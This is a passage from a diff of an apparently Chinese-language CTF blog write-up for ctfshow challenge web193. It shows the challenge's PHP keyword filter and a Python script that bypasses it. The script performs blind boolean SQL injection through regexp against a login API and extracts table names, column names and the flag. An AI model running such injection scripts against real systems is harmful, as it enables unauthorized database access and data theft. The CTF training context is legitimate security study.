class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
 <h3 id="web193"><a class="header-anchor" href="#web193">¶</a>web193</h3>
+<p>这次增加了过滤</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii|ord|hex|substr/i&#x27;</span>, $username))&#123;</span><br><span class="line">       $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">       <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>把substr给ban了，正则没ban，可以用正则来写，代码中的<code>^</code>代表从第一位开始匹配</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/11 14:03</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://4c28d2d4-bcae-4e08-9e24-dfa0cb694305.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_flxg&quot;</span></span><br><span class="line">        username_data = <span class="string">&quot;admin&#x27; and if((&#123;0&#125;)regexp(&#x27;^&#123;1&#125;&#x27;), 1, 0)=1#&quot;</span>.format(payload, flag + j)</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: username_data,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
+<h3 id="web194"><a class="header-anchor" href="#web194">¶</a>web194</h3>
 ]]></content>
       <tags>
         <tag>CTF</tag>
